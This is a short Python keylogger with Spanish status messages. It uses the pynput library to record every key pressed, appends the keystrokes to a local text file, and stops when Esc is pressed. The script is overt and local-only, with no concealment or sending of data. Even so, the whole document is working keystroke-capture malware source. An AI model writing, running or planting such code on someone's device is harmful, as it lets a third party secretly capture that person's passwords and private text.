from pynput import keyboard

stop_keylogger = False

def keyPressed(key):
    global stop_keylogger
    with open("keyfile.txt", 'a') as logKey:
        try:
            if hasattr(key, 'char') and key.char is not None:
                logKey.write(key.char)
            else:
                logKey.write(f"[{key}]")
        except Exception as e:
            print(f"Error al registrar la tecla: {e}")

    if key == keyboard.Key.esc:  
        stop_keylogger = True
        return False


if __name__ == "__main__":
    print("Keylogger en ejecución. Pulsa Esc para detenerlo.")
    with keyboard.Listener(on_press=keyPressed) as listener:
        listener.join()

    print("Keylogger detenido.")